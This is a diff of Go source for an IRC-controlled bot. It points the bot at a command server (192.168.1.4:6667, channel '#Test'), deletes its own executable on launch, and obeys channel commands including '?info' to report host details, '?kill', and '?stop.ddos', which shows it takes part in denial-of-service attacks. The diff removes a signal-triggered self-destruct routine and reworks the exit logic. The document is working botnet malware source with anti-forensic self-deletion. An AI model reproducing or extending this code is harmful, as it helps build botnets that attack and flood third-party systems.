@@ -5,9 +5,7 @@ import (
 	"fmt"
 	"net/textproto"
 	"os"
-	"os/signal"
 	"runtime"
-	"syscall"
 
 	"bot/tools"
 )
@@ -28,50 +26,34 @@ import (
 //////////////////////////////////////////////////////////////////////////
 
 const (
-	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
-	IRC_Channel       = "" //config channel here. //should have space!!! //"#Example "
-	IRC_Chan_Password = "" //config channel password here.
-	Payload_Name      = "" //config payload name.
+	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
+	IRC_Channel       = "#Test "           //config channel here. //should have space!!! //"#Example "
+	IRC_Chan_Password = ""                 //config channel password here.
+	Payload_Name      = "payload"          //config payload name.
 )
 
 //////////////////////////////////////////////////////////////////////////
 //                         STOP CONFIG HERE!!!                         //
 ////////////////////////////////////////////////////////////////////////
 
-func selfDestruct() {
-	os.Remove(os.Args[0])
-	os.Exit(0)
-}
-
 func main() {
-	if runtime.GOOS != "linux" {
-		selfDestruct()
+	if runtime.GOOS == "linux" {
+		os.Remove(os.Args[0])
+	} else {
+		os.Remove(os.Args[0])
+		os.Exit(0)
 	}
 	irc := tools.IRC_Conn(IRC_Server)
 	tp := textproto.NewReader(bufio.NewReader(irc))
 	tools.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)
 
-	sig := make(chan os.Signal)
-	signal.Notify(sig,
-		syscall.SIGHUP,
-		syscall.SIGINT,
-		syscall.SIGQUIT,
-		syscall.SIGTERM,
-	)
-
-	//Inturrupt Checker
-	go func() {
-		<-sig
-		selfDestruct()
-	}()
-
 	for {
 		ircRead, err := tp.ReadLine()
 
-		//Server signal interact
+		//Server interact
 		go func() {
 			if err != nil {
-				selfDestruct()
+				os.Exit(0)
 			}
 			if tools.IRC_Find(ircRead, "PING :") {
 				tools.IRC_Send(irc, "PONG "+tools.IRC_Recv(ircRead, 1))
@@ -108,7 +90,7 @@ func main() {
 			} else if tools.IRC_Find(ircRead, "?info") {
 				tools.ReportInf(irc, IRC_Channel)
 			} else if tools.IRC_Find(ircRead, "?kill") {
-				selfDestruct()
+				os.Exit(0)
 			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
 				tools.DDoS_Switch = true
 				tools.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
